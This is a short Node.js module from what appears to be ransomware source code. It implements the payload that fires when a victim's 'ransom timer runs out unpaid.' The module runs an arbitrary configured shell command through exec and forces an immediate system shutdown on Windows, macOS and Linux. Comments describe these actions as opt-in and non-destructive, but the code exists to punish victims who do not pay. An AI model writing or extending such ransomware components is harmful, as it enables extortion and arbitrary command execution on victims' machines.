'use strict';
// "Death" behavior: what happens if the ransom timer runs out unpaid.
// Both actions below are OFF by default (config.CrashOnDeath / config.ExecCMDOnDeath) and must
// be explicitly opted into. This module NEVER enables them itself.
//
// - runConfiguredCommand: runs config.CMDOnDeath through the OS's own shell. This is a purely
//   local, explicitly user-configured action -- never remotely triggered, never used for
//   persistence or privilege escalation.
// - crashOnDeath: platform-appropriate non-destructive-to-files "shutdown" analogue. We never
//   attempt the Windows RtlSetProcessIsCritical() self-BSOD trick (that's Windows-only kernel
//   behavior and stays out of the cross-platform build); the fallback is a normal OS shutdown
//   command, still gated behind the same opt-in flag.
const { exec } = require('child_process');
const log = require('./log');

function runConfiguredCommand(cmdString) {
  if (!cmdString || !cmdString.trim()) return;
  log.warn('Executing user-configured death command:', cmdString);
  exec(cmdString, { timeout: 15000 }, (err) => { if (err) log.warn('Configured command failed', err.message); });
}

function crashOnDeath() {
  log.warn('CrashOnDeath is enabled: initiating platform shutdown.');
  const cmd = process.platform === 'win32' ? 'shutdown /s /t 0'
    : process.platform === 'darwin' ? `osascript -e 'tell app "System Events" to shut down'`
    : 'systemctl poweroff || shutdown -h now';
  exec(cmd, () => { /* system going down; nothing to react to */ });
}

module.exports = { runConfiguredCommand, crashOnDeath };
